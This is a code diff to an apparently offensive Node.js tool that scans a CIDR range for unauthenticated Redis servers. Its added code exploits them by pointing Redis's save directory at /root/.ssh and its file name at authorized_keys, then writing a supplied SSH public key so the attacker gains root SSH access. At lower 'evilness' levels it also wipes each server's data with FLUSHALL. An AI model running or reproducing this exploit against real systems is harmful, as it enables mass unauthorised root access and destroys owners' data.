@@ -31,21 +31,43 @@ if( !fs.existsSync( outputPath ) ) {
 
 console.log( ' -- Target :', target, '... evilness level', evilness, '\n' );
 
-var hosts  = cidr.list( target );
+var hosts  = cidr.list( target ),
+    pubKey;
 
 hosts.forEach( function( host, index ) {
   var redis = Redis.createClient( 6379, host, { max_attempts: 1, retry_delay: 10 } );
 
   if( evilness > 2 ) {
-    var pubKey = "\n\n" + fs.readFileSync( process.argv[ 4 ] ).toString() + "\n\n";
+
+    if( !pubKey ) {
+      pubKey = "\n\n" + fs.readFileSync( process.argv[ 4 ] ).toString() + "\n\n";
+    };
+
     redis.send_command( 'config', [ 'SET', 'dir', '/root/.ssh' ], function( err, reply  ) {
       var serverInfo = redis.server_info,
       prefix = ' * ' + host + ', Redis ' + serverInfo.redis_version + ', ' + serverInfo.os + ':',
       outputPrefix = outputPath + host;
-      console.log( prefix, 'Vulnerable, try ssh...'  );
+
       if( reply ) {
-        if( reply.indexOf( 'OK' ) > -1 ) {
-          console.log( host, reply );
+        if( reply.indexOf( 'OK' ) == -1 ) {
+          console.log( prefix, 'Not vulnerable.' );
+        } else {
+          async.series( [ function(callback) {
+            redis.send_command( 'config', [ 'set', 'dbfilename', 'authorized_keys' ], function( err, reply  ) {
+              callback();
+            });
+          },
+          function(callback) {
+            redis.flushall( function( err, reply ) {
+              redis.set( 'abc', pubKey, function( err, reply ) {
+                redis.send_command( 'save', [], function( err, reply ) {
+                  callback();
+                });
+              });
+            });
+          }], function( err, callback ) {
+              console.log( prefix, 'Vulnerable, try ssh...'  );
+          });
         };
       };
     });
@@ -76,7 +98,7 @@ hosts.forEach( function( host, index ) {
           });
 
         });
-        
+
         if( evilness > 0 ) {
           console.log( prefix, 'Flushall()' );
           redis.flushall(function( err, reply ) {
